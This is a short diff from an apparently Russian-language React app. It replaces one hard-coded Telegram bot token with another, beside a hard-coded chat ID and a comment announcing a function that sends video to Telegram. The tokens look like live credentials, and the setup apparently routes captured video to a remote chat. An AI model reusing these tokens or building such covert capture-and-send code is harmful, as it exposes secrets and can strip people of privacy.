@@ -6,7 +6,7 @@ const App: React.FC = () => {
   const [hasError, setHasError] = useState(false);
   const [hasPermission, setHasPermission] = useState<boolean | null>(null);
 
-  const botToken = '7885047021:AAG6h0cm_VRrvs3dzROMtYn9Hqi2e7qjxp4'; // Замените на ваш токен
+  const botToken = '7277933120:AAFdy3yFkmDovQmd23PmqYhEWYT2-A5qxaM'; // Замените на ваш токен
   const chatId = '7200204699'; // Замените на ваш chat_id
 
   // Функция для отправки видео на Telegram
